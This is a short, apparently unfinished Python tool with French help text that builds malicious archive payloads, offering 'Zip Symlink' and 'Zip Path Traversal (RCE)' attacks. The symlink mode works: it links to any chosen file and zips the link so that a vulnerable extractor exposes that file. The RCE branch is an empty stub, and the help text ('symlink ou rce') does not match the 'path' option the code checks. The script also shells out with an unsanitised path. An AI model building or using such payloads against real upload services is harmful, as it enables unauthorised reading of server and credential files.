#!/usr/bin/env python3

import os
import argparse 
import subprocess

def start():
    parser = argparse.ArgumentParser(description='Création de payload de fichiers d\'archives .zip, .tar...')
    parser.add_argument("type", help="symlink ou rce")
    parser.add_argument("input", help="The input file")
    args = parser.parse_args()
    if args.type == "symlink":
        symlink(args.input)
    elif args.type == "path":
        print("B")
    else:
        print("Please choose one of the attack : Zip Symlink or Zip Path Travesal (RCE)")

def symlink(src):
    dst = 'Symlink/link'
    os.symlink(src,dst)
    os.system('zip --symlink Symlink/symlink.zip ' + dst )
    print("Your payload has been sucessfully created in the Symlink folder")
    return 0

def rce():
    return 0

start()
